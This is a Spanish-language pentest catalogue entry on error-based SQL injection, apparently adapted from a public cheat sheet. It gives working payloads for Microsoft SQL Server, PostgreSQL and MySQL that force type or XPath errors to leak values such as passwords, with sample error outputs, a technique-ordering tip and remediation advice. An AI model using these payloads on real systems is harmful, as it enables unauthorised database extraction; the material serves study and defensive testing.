---
clase: inyeccion
tech: sql-multi-dbms
cwe: CWE-209
cvss: 8.6 # [derivado] extraccion directa de datos, mucho mas rapida que bit a bit
payload: |
  # Consultas LITERALES de la fuente, con el mensaje de error que producen.
  # En la fuente el '>' separa la consulta del texto del error; aqui lo marco como '=>'.
  #
  # Microsoft:
  SELECT 'foo' WHERE 1 = (SELECT 'secret')
  # => Conversion failed when converting the varchar value 'secret' to data type int.
  #
  # PostgreSQL:
  SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
  # => invalid input syntax for integer: "secret"
  #
  # MySQL:
  SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
  # => XPATH syntax error: '\secret'
  #
  # Oracle: AUSENTE de la pagina fuente. No invento una variante.
  #
  # Mecanica: forzar que el dato a robar se use donde se espera OTRO TIPO. El motor
  # falla y, al explicar por que, IMPRIME el valor en el mensaje de error.
  # MySQL es el caso mas elegante: 0x5c es la barra invertida, un caracter invalido en
  # XPath, asi que EXTRACTVALUE falla e incluye el valor concatenado en el mensaje.
precondicion: "La aplicacion muestra al usuario los mensajes de error de la base de datos sin filtrarlos. Es la precondicion completa: si los errores se capturan y se sustituyen por un texto generico, la tecnica muere aunque la inyeccion exista."
como_se_descubre: |
  Señal en recon: cualquier mensaje de error de base de datos visible en la respuesta.
  Un simple error de sintaxis que se filtre al usuario ya indica que el canal existe,
  y conviene aprovecharlo ANTES de montar extraccion bit a bit: un mensaje de error
  devuelve un valor COMPLETO por peticion, frente a un bit.
  Orden de preferencia practico: mensajes de error > union > errores condicionales >
  retardos temporales. Cada escalon es un orden de magnitud mas lento que el anterior.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: SELECT 'foo' WHERE 1 = (SELECT 'secret')  -> el error IMPRIME el valor
  # B: provocar un error de sintaxis trivial     -> comprobar que los errores de BD
  #    llegan al usuario en general
  # El par B es el corte temprano: si B no muestra error de BD, esta tecnica entera
  # esta descartada y hay que pasar a errores condicionales o retardos. Una peticion
  # ahorra toda la rama.
mata: |
  - Los errores de BD se capturan y se muestran como pagina generica -> muere.
  - El error se registra pero no se devuelve al cliente.
  - Oracle: la fuente no documenta variante; no asumir que existe sin verificar.
  - WAF que bloquee CAST, EXTRACTVALUE o CONVERT por palabra clave.
fuente: "https://portswigger.net/web-security/sql-injection/cheat-sheet (seccion 'Extracting data via visible error messages'). Consultas y textos de error literales de la pagina. Oracle no figura en esta seccion."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Extracción por mensajes de error — hacer que el motor imprima el dato al quejarse

## Principio
Un mensaje de error bien intencionado es un canal de datos. La técnica consiste en usar
el valor que se quiere robar donde el motor espera otro tipo: el motor falla y, al
explicar por qué, **incluye el valor** en el texto del error. No se extrae el dato: se
hace que la base de datos lo recite.

## Payload
**Microsoft:**
```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret')
```
→ `Conversion failed when converting the varchar value 'secret' to data type int.`

**PostgreSQL:**
```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
```
→ `invalid input syntax for integer: "secret"`

**MySQL:**
```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
```
→ `XPATH syntax error: '\secret'`

Oracle está **ausente** de esta sección de la fuente, así que no incluyo variante: una
inventada sería exactamente lo que este catálogo no debe contener.

## El caso de MySQL merece mirarse
`0x5c` es la barra invertida, un carácter inválido en XPath. `EXTRACTVALUE` concatena el
valor robado tras ese carácter, intenta parsearlo como XPath, falla, y al informar del
error imprime la cadena completa. Es un ejemplo limpio de la forma general de la técnica:
no hace falta una función de "imprimir", basta provocar un fallo en un parser que incluya
su entrada en el diagnóstico.

## Por qué probar esto primero
Un mensaje de error devuelve un **valor completo por petición**. Los errores
condicionales devuelven un bit; los retardos, un bit lento. El orden de preferencia
práctico es: mensajes de error → union → errores condicionales → retardos. Cada escalón
es aproximadamente un orden de magnitud más lento que el anterior, así que una sola
petición que compruebe si los errores se filtran puede ahorrar horas de extracción bit a
bit.

## Impacto
Extracción directa y rápida de datos arbitrarios. Con acceso al esquema, basta iterar
filas.

## Remediación
Consultas parametrizadas para la inyección. Y para este canal en concreto: **nunca
devolver mensajes de error de base de datos al cliente**. Registrarlos del lado del
servidor y responder con un texto genérico idéntico al de cualquier otro fallo. Es una
corrección barata que elimina el canal más rápido de explotación aunque la inyección
siga presente.
